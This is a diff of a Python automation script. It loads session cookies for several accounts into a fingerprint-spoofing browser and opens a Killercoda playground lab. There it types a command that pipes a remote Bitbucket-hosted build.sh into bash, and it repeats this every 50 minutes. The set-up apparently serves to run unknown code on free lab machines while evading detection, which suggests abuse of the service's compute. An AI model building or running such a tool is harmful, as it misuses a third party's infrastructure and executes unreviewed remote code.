@@ -30,7 +30,7 @@ else:
     sessions = all_sessions
 
 LAB_URL = "https://killercoda.com/course-cnpe/scenario/playground"
-COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/b0d467b192aac8ff15945685142c57ad8d39c8ca/build.sh' | bash", "free -m"]
+COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/932b85db83a23d7a025635ffe692b2cea616ea0d/build.sh' | bash", "free -m"]
 
 with Camoufox(
     os=["windows", "macos", "linux"],
@@ -41,80 +41,80 @@ with Camoufox(
     block_webrtc=True,
     locale="en-US",
 ) as browser:
+    # Create contexts/pages once, reuse them across iterations
+    pages = []
+    for s in sessions:
+        email = s.get("email", "?")
+        cookies = s.get("cookies", [])
+        print(f"[+] Opening session: {email}")
+        ctx = browser.new_context()
+        ctx.add_cookies(cookies)
+        page = ctx.new_page()
+        page.goto("https://killercoda.com/", wait_until="domcontentloaded", timeout=60000)
+        print(f"    -> {page.url}")
+        pages.append(page)
+
     while True:
-        for s in sessions:
-            email = s.get("email", "?")
-            cookies = s.get("cookies", [])
-            print(f"[+] Opening session: {email}")
-
-            ctx = browser.new_context()
-            ctx.add_cookies(cookies)
-            page = ctx.new_page()
-            page.goto("https://killercoda.com/", wait_until="domcontentloaded", timeout=60000)
-            print(f"    -> {page.url}")
-
+        for page in pages:
             # --- prepare the lab ---
             print(f"[+] Navigating to lab: {LAB_URL}")
             page.goto(LAB_URL, wait_until="networkidle", timeout=90000)
             time.sleep(3)  # let dynamic elements settle
 
-        elements = page.query_selector_all("*")
-        dump = []
-        for el in elements:
-            try:
-                tag = el.evaluate("e => e.tagName.toLowerCase()")
-                text = el.inner_text().strip()[:200]
-                attrs = el.evaluate("""e => {
-                    let o = {};
-                    for (let a of e.attributes) o[a.name] = a.value;
-                    return o;
-                }""")
-                dump.append({"tag": tag, "text": text, "attrs": attrs})
-            except Exception:
-                pass
-
-        with open("lab_dump.json", "w") as f:
-            json.dump(dump, f, indent=2)
-        print(f"[+] Dumped {len(dump)} elements to lab_dump.json")
-
-        # --- debug: find terminal frame ---
-        print("[+] Waiting for terminal frame to load...")
-        terminal_frame = None
-        for attempt in range(60):  # up to 5 minutes
-            for frame in page.frames:
+            elements = page.query_selector_all("*")
+            dump = []
+            for el in elements:
                 try:
-                    el = frame.query_selector("#terminal-container")
-                    if el:
-                        terminal_frame = frame
-                        break
+                    tag = el.evaluate("e => e.tagName.toLowerCase()")
+                    text = el.inner_text().strip()[:200]
+                    attrs = el.evaluate("""e => {
+                        let o = {};
+                        for (let a of e.attributes) o[a.name] = a.value;
+                        return o;
+                    }""")
+                    dump.append({"tag": tag, "text": text, "attrs": attrs})
                 except Exception:
                     pass
+
+            with open("lab_dump.json", "w") as f:
+                json.dump(dump, f, indent=2)
+            print(f"[+] Dumped {len(dump)} elements to lab_dump.json")
+
+            # --- debug: find terminal frame ---
+            print("[+] Waiting for terminal frame to load...")
+            terminal_frame = None
+            for attempt in range(60):  # up to 5 minutes
+                for frame in page.frames:
+                    try:
+                        el = frame.query_selector("#terminal-container")
+                        if el:
+                            terminal_frame = frame
+                            break
+                    except Exception:
+                        pass
+                if terminal_frame:
+                    print(f"[+] Found terminal in frame: {terminal_frame.url}")
+                    break
+                time.sleep(5)
+                print(f"  retrying... ({attempt+1}/60)")
+            else:
+                print("[-] Terminal frame never found")
+
             if terminal_frame:
-                print(f"[+] Found terminal in frame: {terminal_frame.url}")
-                break
-            time.sleep(5)
-            print(f"  retrying... ({attempt+1}/60)")
-        else:
-            print("[-] Terminal frame never found")
+                terminal_frame.wait_for_selector(".xterm-helper-textarea", timeout=60000)
+                time.sleep(2)
 
-        if terminal_frame:
-            # wait for xterm textarea to appear
-            terminal_frame.wait_for_selector(".xterm-helper-textarea", timeout=60000)
-            time.sleep(2)
+                textarea = terminal_frame.query_selector(".xterm-helper-textarea")
+                textarea.click()
+                print("[+] Terminal focused, sending commands...")
 
-            textarea = terminal_frame.query_selector(".xterm-helper-textarea")
-            textarea.click()
-            print("[+] Terminal focused, sending commands...")
-
-            for cmd in COMMANDS:
-                textarea.type(cmd, delay=80)
-                page.keyboard.press("Enter")
-                print(f"[+] Sent: {cmd}")
-                time.sleep(2)  # wait for output
-
-        # --- end terminal ---
+                for cmd in COMMANDS:
+                    textarea.type(cmd, delay=80)
+                    page.keyboard.press("Enter")
+                    print(f"[+] Sent: {cmd}")
+                    time.sleep(2)
 
         # Sleep 50 minutes then repeat
         print("[+] Sleeping 50 minutes before revisiting...")
-        time.sleep(60 * 60)
+        time.sleep(50 * 60)
         print("[+] Revisiting lab URL...")
